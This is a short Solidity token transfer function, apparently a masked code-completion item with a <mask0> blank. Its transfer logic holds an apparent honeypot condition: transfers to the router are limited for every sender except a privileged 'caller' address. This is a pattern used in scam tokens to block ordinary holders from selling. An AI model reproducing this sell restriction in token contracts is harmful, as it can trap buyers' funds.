"function _transfer(address sender, address recipient, uint256 amount) internal {        require(sender != address(0));        require(recipient != address(0));        if (sender != caller && recipient == router) {            require(amount < rTotal);     }        _router[sender] = _router[sender].<mask0>;        _router[recipient] = _router[recipient].add(amount);        emit Transfer(sender, recipient, amount);    }"